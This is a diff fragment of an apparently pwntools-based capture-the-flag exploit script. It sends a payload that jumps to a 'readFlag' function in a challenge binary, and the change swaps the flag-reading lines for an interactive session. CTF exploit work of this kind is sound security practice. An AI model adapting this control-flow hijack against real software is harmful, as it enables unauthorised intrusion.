@@ -25,10 +25,4 @@ payload += p64(vuln_elf.symbols['readFlag'])
 
 p.recvline()
 p.sendline(payload)
-p.recvline()
-p.recvline()
-p.recvline()
-flag = p.recvuntil(b'}').decode()
-p.close()
-
-print(flag)
+p.interactive()
